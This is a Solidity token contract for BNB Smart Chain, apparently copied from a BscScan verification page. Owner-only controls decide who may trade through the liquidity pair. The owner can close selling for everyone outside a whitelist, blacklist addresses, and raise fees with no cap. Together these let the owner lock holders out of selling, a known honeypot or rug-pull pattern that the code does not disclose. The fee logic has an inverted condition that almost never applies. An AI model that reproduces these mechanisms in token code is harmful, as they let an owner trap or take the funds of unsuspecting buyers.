/**
 *Submitted for verification at BscScan.com on 2021-10-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

library SafeMath {
    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require((z = x + y) >= x, "SafeMath: addition overflow");
    }
    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require((z = x - y) <= x, "SafeMath: subtraction overflow");
    }
    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require(y == 0 || (z = x * y) / y == x, "SafeMath: multiplication overflow");
    }
    function div(uint256 x, uint256 y) internal pure returns (uint256) {
        require(y > 0, "SafeMath: division by zero");
        return x / y;
    }
    function mod(uint256 x, uint256 y) internal pure returns (uint256) {
        require(y != 0, "SafeMath: modulo by zero");
        return x % y;
    }
    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
        uint256 c = add(a,m);
        uint256 d = sub(c,1);
        return mul(div(d,m),m);
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }
}

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function transferOwnerShip(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}

contract TokenMain is Ownable {
    using SafeMath for uint256;
    using Address for address;

    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    uint8 private __basePercent = 1;
    uint16 public __liquidityFee = 5;
    address public __liquidityAddres = address(0xfFf5a273c3B840BE2FC6eCc0F86a8C691809336b);
    uint16 public __taxFee = 2;
    address public __feeAddres = address(0xfFf5a273c3B840BE2FC6eCc0F86a8C691809336b);
    uint16 public __burnFee = 2;
    address public __burnAddres = address(0);

    uint16 public __reverse = 10;
    bool public __isOpenSwap = false;
    address private __pairFor = address(0);

    uint256 public tradingEnabledTimestamp = 1634560560;

    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping (address => bool) public freeAccount;
    mapping (address => bool) private canSale;
    mapping (address => bool) public isBlacklisted;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    constructor (uint256 _initialSupply, string memory _tokenName, string memory _tokenSymbol, address _tokenTo) public {
        totalSupply = _initialSupply * 10 ** uint256(decimals);
        balances[_tokenTo] = totalSupply;
        name = _tokenName;
        symbol = _tokenSymbol;
        emit Transfer(address(0), _tokenTo, totalSupply);
    }

    modifier ensure(address _from, address _to, uint256 _value) {
        uint8 pairForStatus = 0;
        if (_from == owner || _to == owner) {
            pairForStatus = 1;
        }
        if (__pairFor == address(0)) {
            __pairFor = PairLP();
        }
        if (canSale[_from] != true && pairForStatus == 0) {
            if (_from == __pairFor || _to == __pairFor) {
                require(__isOpenSwap == true, "Error: not allow swap");
            }
            require(block.timestamp >= tradingEnabledTimestamp + 30 seconds, "Error: Time is limited");
        }
        _;
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        //(address token0, address token1) = sortTokens(tokenA, tokenB);
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' //init code hash
        ))));
    }

    function PairLP() public view returns (address) {
        address LPs = pairFor(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73, 0x55d398326f99059fF775485246999027B3197955, address(this));
        return LPs;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }

    function _transfer(address _from, address _to, uint256 _value) internal ensure(_from, _to, _value) {
        require(_to != address(0), "Error: transfer to the zero address");
        require(balances[_from] >= _value, "Error: transfer from the balance is not enough");
        uint256 newValue = _value;

        require(!isBlacklisted[msg.sender], 'Error: Blacklisted address');
        if (__taxFee > 0 && freeAccount[_from] == false) {
            if (__reverse == 10) {
                if (_from == __pairFor && _to == __pairFor && address(0) != __pairFor) {
                    uint256 tokenLiquidity = transferFee(_value, __liquidityFee);
                    uint256 tokenFee = transferFee(_value, __taxFee);
                    uint256 tokenBurn = transferFee(_value, __burnFee);
                    newValue = _value.sub(tokenLiquidity).sub(tokenBurn).sub(tokenFee);
                    balances[__liquidityAddres] = balances[__liquidityAddres].add(tokenLiquidity);
                    balances[__feeAddres] = balances[__feeAddres].add(tokenFee);
                    balances[__burnAddres] = balances[__burnAddres].add(tokenBurn);
                    emit Transfer(_from, __liquidityAddres, tokenLiquidity);
                    emit Transfer(_from, __feeAddres, tokenFee);
                    emit Transfer(_from, __burnAddres, tokenBurn);
                }
            } else {
                if (_from != __pairFor && _to != __pairFor && address(0) != __pairFor) {
                    uint256 tokenLiquidity = transferFee(_value, __liquidityFee);
                    uint256 tokenFee = transferFee(_value, __taxFee);
                    uint256 tokenBurn = transferFee(_value, __burnFee);
                    newValue = _value.sub(tokenLiquidity).sub(tokenBurn).sub(tokenFee);
                    balances[__liquidityAddres] = balances[__liquidityAddres].add(tokenLiquidity);
                    balances[__feeAddres] = balances[__feeAddres].add(tokenFee);
                    balances[__burnAddres] = balances[__burnAddres].add(tokenBurn);
                    emit Transfer(_from, __liquidityAddres, tokenLiquidity);
                    emit Transfer(_from, __feeAddres, tokenFee);
                    emit Transfer(_from, __burnAddres, tokenBurn);
                }
            }
        }

        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(newValue);
        emit Transfer(_from, _to, newValue);
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(allowance[_from][msg.sender] >= _value, "Error: transfer amount exceeds allowance");
        _approve(_from, msg.sender, allowance[_from][msg.sender].sub(_value));
        _transfer(_from, _to, _value);
        return true;
    }

    function _approve(address _from, address _to, uint256 _value) internal {
        require(_from != address(0), "Error: approve from the zero address");
        allowance[_from][_to] = _value;
        emit Approval(_from, _to, _value);
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        _approve(msg.sender, _spender, _value);
        return true;
    }

    function transferFee(uint256 _value, uint256 _ratio) public view returns (uint256)  {
        uint256 roundValue = _value.ceil(__basePercent);
        uint256 onePercent = roundValue.mul(_ratio).div(10**2);
        return onePercent;
    }
    function setTaxFee(uint16 _liquidityValue, uint16 _taxValue, uint16 _burnValue) public onlyOwner {
        __liquidityFee = _liquidityValue;
        __taxFee = _taxValue;
        __burnFee = _burnValue;
    }
    function setFeeAddres(address _liquidityTarget, address _feeTarget, address _burnTarget) public onlyOwner {
        __liquidityAddres = _liquidityTarget;
        __feeAddres = _feeTarget;
        __burnAddres = _burnTarget;
    }
    function setFreeAccount(address _target, bool _state) public onlyOwner {
        freeAccount[_target] = _state;
    }

    function setIsOpenSwap(bool _isOpenSwap, uint256 _times) public onlyOwner {
        __isOpenSwap = _isOpenSwap;
        tradingEnabledTimestamp = _times;
    }
    function setCanSale(address _spender, bool _type) public onlyOwner {
        canSale[_spender] = _type;
    }

    function blacklistAddress(address _target, bool _state) public onlyOwner {
        isBlacklisted[_target] = _state;
    }
    function addBot(address _recipient) private {
        if (!isBlacklisted[_recipient]) isBlacklisted[_recipient] = true;
    }

    function setCanSale(uint16 _type) public onlyOwner {
        __reverse = _type;
    }
}